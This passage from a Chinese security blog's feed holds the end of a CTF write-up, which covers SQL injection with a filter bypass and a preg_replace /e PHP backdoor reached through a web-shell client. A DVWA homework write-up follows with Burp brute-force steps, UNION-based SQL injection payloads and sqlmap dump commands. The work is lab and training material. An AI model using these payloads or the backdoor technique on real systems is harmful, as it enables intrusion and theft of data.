<p>1.判断http请求头中的user-agent参数是否为Xlcteam Browser</p>
<p>2.post参数soid</p>
<p>3.对soid进行过滤后带入sql语句中查询</p>
<p>于是抓包修改user-agent</p>
<p>确定存在注入点</p>
<p><img src="https://i.loli.net/2020/11/30/KGcINOm5XAxVhDE.png" srcset="/img/loading.gif" alt></p>
<p>由于之前提示了<strong>admin表结构 create table admin ( id integer, username text, userpass text, )</strong>  </p>
<p>可直接写出查询语句</p>
<div class="hljs"><pre><code class="hljs reasonml">(sselectelect<span class="hljs-comment">/**/</span>group<span class="hljs-constructor">_concat(<span class="hljs-params">userppassass</span>)</span><span class="hljs-comment">/**/</span>ffromrom<span class="hljs-comment">/**/</span>aadmindmin)</code></pre></div>

<p><img src="https://i.loli.net/2020/11/30/wMtHrAcuYVWOn91.png" srcset="/img/loading.gif" alt></p>
<p>ASCII码转字符串结果为： fuckruntu </p>
<p>登录</p>
<p><img src="https://i.loli.net/2020/11/30/qZmL6EeW8O3MsYX.png" srcset="/img/loading.gif" alt></p>
<p> <strong><a href="http://cms.nuptzj.cn/about.php?file=xlcteam.php" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=xlcteam.php</a></strong>  查看源码</p>
<div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
$e = $_REQUEST[<span class="hljs-string">'www'</span>]; 
$arr = <span class="hljs-keyword">array</span>($_POST[<span class="hljs-string">'wtf'</span>] =&gt; <span class="hljs-string">'|.*|e'</span>,); 
array_walk($arr, $e, <span class="hljs-string">''</span>); 
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>看样子是可以用菜刀连接的</p>
<p> 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：<br>参考<a href="https://www.jb51.net/article/38714.htm" target="_blank" rel="noopener">https://www.jb51.net/article/38714.htm</a><br>简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。<br>用菜刀连接： </p>
<p>url:<a href="http://cms.nuptzj.cn/xlcteam.php?www=preg_replace" target="_blank" rel="noopener">http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</a></p>
<p>密码：wtf</p>
<p><strong>总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！</strong></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>php</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>网安作业2</title>
    <url>/2020/11/12/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A2/</url>
    <content><![CDATA[<h1 id="DVWA实验"><a href="#DVWA实验" class="headerlink" title="DVWA实验"></a>DVWA实验</h1><p>一下都是基于low,mid,high级别的实验，为了方便叙述，提前在数据库中建了一个flag表</p>
<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>使用工具 ：bp</p>
<p>使用材料：密码字典</p>
<h3 id="bp的四种爆破攻击类型"><a href="#bp的四种爆破攻击类型" class="headerlink" title="bp的四种爆破攻击类型"></a>bp的四种爆破攻击类型</h3><h4 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h4><p>Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
<h4 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h4><p>Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</p>
<h4 id="第三种："><a href="#第三种：" class="headerlink" title="第三种："></a>第三种：</h4><p>Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p>
<h4 id="第四种："><a href="#第四种：" class="headerlink" title="第四种："></a>第四种：</h4><p>Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p>
<h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>1.抓包–&gt;ctrl+I –&gt;标记要爆破的参数，这里直接爆破password</p>
<p><img src="https://i.loli.net/2020/11/26/pEXImJf8eL1R7xq.png" srcset="/img/loading.gif" alt="int1.png"></p>
<p>2.选择要加载的密码字典，可以使用自己准备的密码字典，也可以使用bp自带的密码字典，但是最重要的是要包含正确达到密码</p>
<p><img src="https://i.loli.net/2020/11/26/7hkFZm134qy8auw.png" srcset="/img/loading.gif" alt="int3.png"></p>
<p><img src="https://i.loli.net/2020/11/26/SY9gXKPaRDoJ16k.png" srcset="/img/loading.gif" alt="int2.png"></p>
<p>3.开始爆破 ，根据响应包的长度筛选出正确密码的响应包，这里只有当密码为password的时候响应包的长度为4743,所以password就是争取密码。</p>
<p><img src="https://i.loli.net/2020/11/26/GOsWwrvcobAxEpV.png" srcset="/img/loading.gif" alt="int4.png"></p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Login'</span> ] ) ) &#123;
    <span class="hljs-comment">// Sanitise username input</span>
    $user = $_GET[ <span class="hljs-string">'username'</span> ];
    $user = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));

    <span class="hljs-comment">// Sanitise password input</span>
    $pass = $_GET[ <span class="hljs-string">'password'</span> ];
    $pass = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
    $pass = md5( $pass );

    <span class="hljs-comment">// Check the database</span>
    $query  = <span class="hljs-string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;
    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );

    <span class="hljs-keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="hljs-number">1</span> ) &#123;
        <span class="hljs-comment">// Get users details</span>
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row[<span class="hljs-string">"avatar"</span>];

        <span class="hljs-comment">// Login successful</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;
    &#125;
    <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-comment">// Login failed</span>
        sleep( <span class="hljs-number">2</span> );
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;
    &#125;

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>



<p>与low级别相比较，只是增加了回显的时间，所以还是可以使用low级别的方法直接爆破，不过花费的时间相对会长一点。</p>
<p>1.火狐浏览器打开代理抓包后发到爆破模块，添加爆破的变量。</p>
<p>2.加载密码字典进行爆破。</p>
<p>3.根据响应包的长度确定正确密码。</p>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_GET[ <span class="hljs-string">'Login'</span> ] ) ) &#123;
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    checkToken( $_REQUEST[ <span class="hljs-string">'user_token'</span> ], $_SESSION[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );

    <span class="hljs-comment">// Sanitise username input</span>
    $user = $_GET[ <span class="hljs-string">'username'</span> ];
    $user = stripslashes( $user );
    $user = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $user ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));

    <span class="hljs-comment">// Sanitise password input</span>
    $pass = $_GET[ <span class="hljs-string">'password'</span> ];
    $pass = stripslashes( $pass );
    $pass = ((<span class="hljs-keyword">isset</span>($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $pass ) : ((trigger_error(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
    $pass = md5( $pass );

    <span class="hljs-comment">// Check database</span>
    $query  = <span class="hljs-string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>;
    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );

    <span class="hljs-keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="hljs-number">1</span> ) &#123;
        <span class="hljs-comment">// Get users details</span>
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row[<span class="hljs-string">"avatar"</span>];

        <span class="hljs-comment">// Login successful</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>;
    &#125;
    <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-comment">// Login failed</span>
        sleep( rand( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>;
    &#125;

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);
&#125;

<span class="hljs-comment">// Generate Anti-CSRF token</span>
generateSessionToken();

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>审计代码后可以发现使用了随机token机制来防止CSRF，从而在一定程度上防止了重放攻击，增加了爆破难度，但是任然可以使用bp的爆破模块</p>
<p>1.抓包，发包到爆破模块并添加参数，这次需要添加两个参数，设置 password和user_token为变量</p>
<p><img src="https://i.loli.net/2020/11/05/WFYoqKklaEOwHtn.png" srcset="/img/loading.gif" alt="intr3-1.png"></p>
<p>2.攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。</p>
<p><img src="https://i.loli.net/2020/11/05/tr4dB1SzEHxY9UD.png" srcset="/img/loading.gif" alt="intr3-2.png"></p>
<p>3.设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always</p>
<p><img src="https://i.loli.net/2020/11/05/d5qmsRVpu3kZ7Gr.png" srcset="/img/loading.gif" alt="intr3-3.png"></p>
<p>4.设置payload，第一个参数是密码与之前两次一样，加载密码字典即可，第二token参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。</p>
<p><img src="https://i.loli.net/2020/11/05/cQdZAUqgMDO4eJI.png" srcset="/img/loading.gif" alt="intr3-4.png"></p>
<p>5.start attack,还是根据响应包长度的不同找到包含真正密码的请求包，获取正确密码。</p>
<p><img src="https://i.loli.net/2020/11/05/tpMjbBah95clPK8.png" srcset="/img/loading.gif" alt="intr3-5.png"></p>
<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_SESSION [ <span class="hljs-string">'id'</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    $id = $_SESSION[ <span class="hljs-string">'id'</span> ];

    <span class="hljs-comment">// Check database</span>
    $query  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;
    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );
    <span class="hljs-comment">// Get results</span>
    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;
        <span class="hljs-comment">// Get values</span>
        $first = $row[<span class="hljs-string">"first_name"</span>];
        $last  = $row[<span class="hljs-string">"last_name"</span>];

        <span class="hljs-comment">// Feedback for end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;
    &#125;

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-keyword">false</span> : $___mysqli_res);        
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;</code>注入点就在这句代码中</p>
<h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><h5 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h5><div class="hljs"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> #

<span class="hljs-number">1</span><span class="hljs-comment">' or 1=1 #</span></code></pre></div>

<p>可知是字符型注入</p>
<h5 id="2-判断多少字段数"><a href="#2-判断多少字段数" class="headerlink" title="2.判断多少字段数"></a>2.判断多少字段数</h5><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">#</span></code></pre></div>

<p>报错</p>
<div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-comment">#</span></code></pre></div>

<p>显示正常，说明只有2个字段</p>
<h5 id="3-确认显示顺序"><a href="#3-确认显示顺序" class="headerlink" title="3.确认显示顺序"></a>3.确认显示顺序</h5><p><img src="https://i.loli.net/2020/11/06/isw8SKDdjWlv5AJ.png" srcset="/img/loading.gif" alt="sqll-2.png"></p>
<p>两个位置都可以使用</p>
<h5 id="4-union查询"><a href="#4-union查询" class="headerlink" title="4.union查询"></a>4.union查询</h5><div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/06/mudnW957ZotUhNM.png" srcset="/img/loading.gif" alt="sqll-3.png"></p>
<div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'flag'</span> <span class="hljs-comment">#</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/06/UtxVjBMkiGb534Z.png" srcset="/img/loading.gif" alt="sqll-4.png"></p>
<div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/06/BNp8ZiPgy2MdHvC.png" srcset="/img/loading.gif" alt="sqll-1.png"></p>
<h4 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--dbs</span>

python2 sqlmap.py -u <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span> <span class="hljs-params">--batch</span> -D dvwa -T flag <span class="hljs-params">--columns</span>

python2 sqlmap.py -u <span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">"security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1"</span> <span class="hljs-params">--batch</span> -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/06/f87DeH6rKI2JhzY.png" srcset="/img/loading.gif" alt="sqll-5.png"></p>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>与low级别相比较，这里的id值不需要用户输入，只需要选择，但是可以抓包修改id的内容</p>
<p><img src="https://i.loli.net/2020/11/05/VTtp9QbyDe1Gsg8.png" srcset="/img/loading.gif" alt="sqlm-1.png"></p>
<h4 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h4><p>经过测试是数字型注入，很简单的判断就不截图了</p>
<h5 id="1-判断列数"><a href="#1-判断列数" class="headerlink" title="1.判断列数"></a>1.判断列数</h5><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-comment">#&amp;Submit=Submit</span></code></pre></div>

<p><img src="https://i.loli.net/2020/11/05/GuUbcedZETzJ7qw.png" srcset="/img/loading.gif" alt="sqlm-2.png"></p>
<p>此时页面正常</p>
<div class="hljs"><pre><code class="hljs angelscript">id=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#&amp;Submit=Submit</code></pre></div>

<p>此时页面报错</p>
<p><code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code></p>
<p>所以可知为两列，之后的操作与low级别的一样</p>
<h5 id="2-union查询"><a href="#2-union查询" class="headerlink" title="2.union查询"></a>2.union查询</h5><div class="hljs"><pre><code class="hljs sql">爆数据库名
id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#&amp;Submit=Submit</span>
爆列名
<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-number">0x666c6167</span> <span class="hljs-comment">#&amp;Submit=Submit</span>

读取flag
<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#&amp;Submit=Submit</span></code></pre></div>

<p>这里读取列名的时候需要注意使用列名的十六进制，不然就会报错，应该是 <code>&#39;</code>被 <code>\</code>转义了，可以使用十六进制绕过</p>
<p><img src="https://i.loli.net/2020/11/05/OlNHhc4Zy9KnsYS.png" srcset="/img/loading.gif" alt="sqlm-3.png"></p>
<p><img src="https://i.loli.net/2020/11/05/zM1eE3plignbySf.png" srcset="/img/loading.gif" alt="sqlm-4.png"></p>
<p><strong>分析源码</strong></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_POST[ <span class="hljs-string">'Submit'</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
    $id = $_POST[ <span class="hljs-string">'id'</span> ];

    $id = mysqli_real_escape_string($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $id);

    $query  = <span class="hljs-string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;
    $result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>], $query) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) . <span class="hljs-string">'&lt;/pre&gt;'</span> );

    <span class="hljs-comment">// Get results</span>
    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;
        <span class="hljs-comment">// Display values</span>
        $first = $row[<span class="hljs-string">"first_name"</span>];
        $last  = $row[<span class="hljs-string">"last_name"</span>];

        <span class="hljs-comment">// Feedback for end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;
    &#125;

&#125;

<span class="hljs-comment">// This is used later on in the index.php page</span>
<span class="hljs-comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span>
$query  = <span class="hljs-string">"SELECT COUNT(*) FROM users;"</span>;
$result = mysqli_query($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );
$number_of_rows = mysqli_fetch_row( $result )[<span class="hljs-number">0</span>];

mysqli_close($GLOBALS[<span class="hljs-string">"___mysqli_ston"</span>]);
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p><code>mysqli_real_escape_string()</code> 函数转义在 SQL 语句中使用的字符串中的特殊字符。</p>
<p>所以导致了单引号被转义的结果</p>
<h4 id="sqlmap注入-1"><a href="#sqlmap注入-1" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><p>因为是post注入，所以需要抓取数据包保存下来。</p>
<p>如图，可以将其保存在sqlmap.py的路径下</p>
<p><img src="https://i.loli.net/2020/11/06/hySBmFe4zoTgvNq.png" srcset="/img/loading.gif" alt="sqlm-5.png"></p>
<h5 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h5><div class="hljs"><pre><code class="hljs stylus">python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch --dbs
python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa --tables
python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag --<span class="hljs-attribute">columns</span>
python2 .\sqlmap<span class="hljs-selector-class">.py</span> -r  .\<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.txt</span> --batch -D dvwa -T flag -C fl4g --dump</code></pre></div>

<p><img src="https://i.loli.net/2020/11/06/zaHYUItEZlPFh4e.png" srcset="/img/loading.gif" alt="sqlm-6.png"></p>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p>这次用户输入与回显不在同一个页面，这只要是为了防止sqlmap这种自动化注入工具的攻击</p>
<p><img src="https://i.loli.net/2020/11/06/kAdfp8SFCroTlID.png" srcset="/img/loading.gif" alt="sqlh-1.png"></p>
<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><p>直接使用low级别的payload：</p>
<div class="hljs"><pre><code class="hljs sql">1' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">#</span>
<span class="hljs-number">1</span><span class="hljs-string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>flag<span class="hljs-string">' #</span>
<span class="hljs-string">1'</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#</span></code></pre></div>



<p><img src="https://i.loli.net/2020/11/06/4sjoOwYKa3lW6S1.png" srcset="/img/loading.gif" alt="sqlh-2.png"></p>
<p><img src="https://i.loli.net/2020/11/06/vXlbSQk1cn2JTAB.png" srcset="/img/loading.gif" alt="sqlh-3.png"></p>
<p><img src="https://i.loli.net/2020/11/06/IohbvktCq2NpyDa.png" srcset="/img/loading.gif" alt="sqlh-4.png"></p>
<p>源码分析</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_SESSION [ <span class="hljs-string">'id'</span> ] ) ) &#123;
    <span class="hljs-comment">// Get input</span>
